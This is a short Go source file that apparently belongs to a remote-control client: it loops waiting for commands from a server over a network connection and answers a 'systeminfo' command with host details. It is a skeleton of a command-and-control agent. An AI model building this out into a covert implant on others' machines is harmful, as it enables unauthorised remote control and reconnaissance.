package session

import (
	"fmt"
	"net"
	"src/Client/generic/commands"
	"src/Client/generic/logger"
)

func commandHandler(conn net.Conn) error {
	if conn == nil {
		logger.Error("Connection is nil, cannot handle commands.")
		return fmt.Errorf("connection is nil")
	}

	for {
		// Wait for commands from the server
		logger.Log("Waiting for command from server...")
		command, err := ReceiveData(conn)
		logger.Log(fmt.Sprintf("Received command: %s", string(command)))
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to receive command: %v", err))
			return fmt.Errorf("failed to receive command: %w", err)
		}

		// Process the command
		if err := processCommand(conn, string(command)); err != nil {
			logger.Error(fmt.Sprintf("Failed to process command: %v", err))
			return fmt.Errorf("failed to process command: %w", err)
		}
	}
}

func processCommand(conn net.Conn, command string) error {
	logger.Log(fmt.Sprintf("Received command: %s", command))

	var commandResponse string
	// Example of handling a specific command
	switch command {
	case "systeminfo":
		logger.Log("Received systeminfo command, responding with system information.")
		commandResponse = commands.SysInfoString()
	default:
		logger.Log(fmt.Sprintf("Unknown command: %s", command))
	}

	if commandResponse != "" {
		SendData(conn, []byte(commandResponse))
		logger.Log(fmt.Sprintf("Sent response for command: %s", command))
	}

	return nil
}
